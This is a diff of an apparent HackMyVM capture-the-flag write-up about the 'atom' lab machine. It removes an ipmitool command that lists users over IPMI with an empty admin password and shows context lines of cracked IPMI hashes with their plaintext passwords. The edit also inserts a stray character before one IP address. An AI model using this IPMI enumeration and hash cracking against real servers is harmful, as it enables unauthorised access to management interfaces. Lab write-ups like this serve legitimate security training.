@@ -115,7 +115,7 @@ Permission denied, please try again.
 Using ipmitool, it was possible to grab a list of valid users from the IPMI service. No password was needed to log into this service:
 
 ```bash
-garffff@garffff:~/hackmyvm/atom$ ipmitool -I lanplus -C 0 -H 192.168.0.145 -U admin -P "" user list | ipmi_list.txt
+garffff@garffff:~/hackmyvm/atom$ 
 ID  Name	     Callin  Link Auth	IPMI Msg   Channel Priv Limit
 1                    true    false      false      Unknown (0x00)
 2   admin            true    false      true       ADMINISTRATOR
@@ -490,7 +490,7 @@ Mixing --show with --username can cause exponential delay in output.
 192.168.0.145 kaki:7016c1f940270000743777992cea187da86338bf802de2b9964f9c67f313d2082ec646893f3dd357a123456789abcdefa123456789abcdef14046b616b69:a11056704ead3b102e115683363b3f3387dab94d:numberone
 192.168.0.145 saman:7b73e16fc2270000f847030795994ed6ecea4b0f1ebc6e9441cd1b01bbfaf4b99953201049595c7da123456789abcdefa123456789abcdef140573616d616e:9469e864e47703ff5241315fb500016d9d705acc:090506
 192.168.0.145 kalie:9980b35644280000d58a1ba96a778c96d0a1b1e14bccfec0fcb9d6313be13a7b699ecf1535654a9fa123456789abcdefa123456789abcdef14056b616c6965:62dd5192db2ed5172d35fd911a72eb26d51ae912:billandben
-192.168.0.145 deshawn:6867d5e6c628000050fc601e81774e7651c73c263627ae866e6820dfb756f043d7180df363edc015a123456789abcdefa123456789abcdef14076465736861776e:dd5efe43406af27e5ad991792ff41cd526b784f1:milo123
+s192.168.0.145 deshawn:6867d5e6c628000050fc601e81774e7651c73c263627ae866e6820dfb756f043d7180df363edc015a123456789abcdefa123456789abcdef14076465736861776e:dd5efe43406af27e5ad991792ff41cd526b784f1:milo123
 192.168.0.145 mayeul:4e345c2948290000f845aa4beea4deb884eafdebeb6a151ceef690c5150369b14c12c2d4d10bae37a123456789abcdefa123456789abcdef14066d617965756c:5cfa081f152b51e52ec95d910bfdd72614d915b5:241107
 ```
 
